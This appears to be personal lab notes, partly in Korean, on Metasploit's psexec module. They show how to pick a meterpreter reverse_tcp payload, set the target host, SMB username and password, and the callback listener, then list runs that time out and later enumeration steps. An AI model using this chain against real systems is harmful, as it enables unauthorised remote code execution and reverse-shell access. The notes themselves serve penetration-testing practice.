# select exploit

msf > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(windows/smb/psexec) >

---

# exploit 과 페이로드는 짝처럼 경로 비슷해서 검색하면 됨

# search exploit payload for psexec

msf > search exploit/windows/smb/psexec

# Matching Modules

# Name Disclosure Date Rank Check Description

---

0 exploit/windows/smb/psexec 1999-01-01 manual No Microsoft Windows Authenticated User Code Execution
1 \_ target: Automatic . . . .
2 \_ target: PowerShell . . . .
3 \_ target: Native upload . . . .
4 \_ target: MOF upload . . . .
5 \_ target: Command . . . .

Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/psexec
After interacting with a module you can manually set a TARGET with set TARGET 'Command'

---

# select payload

msf exploit(windows/smb/psexec) > use 0
[*] Using configured payload windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

---

# check options

msf exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

Name Current Setting Required Description

---

SERVICE_DESCRIPTI no Service description to be use
ON d on target for pretty listin
g
SERVICE_DISPLAY_N no The service display name
AME
SERVICE_NAME no The service name
SMBSHARE no The share to connect to, can
be an admin share (ADMIN$,C$,
...) or a normal read/write f
older share

Used when connecting via an existing SESSION:

Name Current Setting Required Description

---

SESSION no The session to run this module on

Used when making a new connection via RHOSTS:

Name Current Setting Required Description

---

RHOSTS no The target host(s), see https://docs.
metasploit.com/docs/using-metasploit/
basics/using-metasploit.html
RPORT 445 no The target port (TCP)
SMBDomain . no The Windows domain to use for authent
ication
SMBPass no The password for the specified userna
me
SMBUser no The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

Name Current Setting Required Description

---

EXITFUNC thread yes Exit technique (Accepted: '', seh, thr
ead, process, none)
LHOST 192.168.65.3 yes The listen address (an interface may b
e specified)
LPORT 4444 yes The listen port

Exploit target:

Id Name

---

0 Automatic

View the full module info with the info, or info -d command.

# set env

smsf exploit(windows/smb/psexec) > set RHOSTS 10.201.58.8
RHOSTS => 10.201.58.8
msf exploit(windows/smb/psexec) > set RPORT 445
RPORT => 445
msf exploit(windows/smb/psexec) > set SMBUser ballen
SMBUser => ballen
msf exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1

# run

msf exploit(windows/smb/psexec) > exploit
[*] Started reverse TCP handler on 192.168.65.3:4444
[*] 10.201.58.8:445 - Connecting to the server...
[-] 10.201.58.8:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (10.201.58.8:445) timed out.
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.65.3:4444
[*] 10.201.58.8:445 - Connecting to the server...
[-] 10.201.58.8:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (10.201.58.8:445) timed out.
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/psexec) >

---

# enum domain name

Use post/windows/gather/enum_domain
show options
session -i

session -i 1
run

# search enum

search enu_share
use 0
show options
sessions -l
set session 2
run
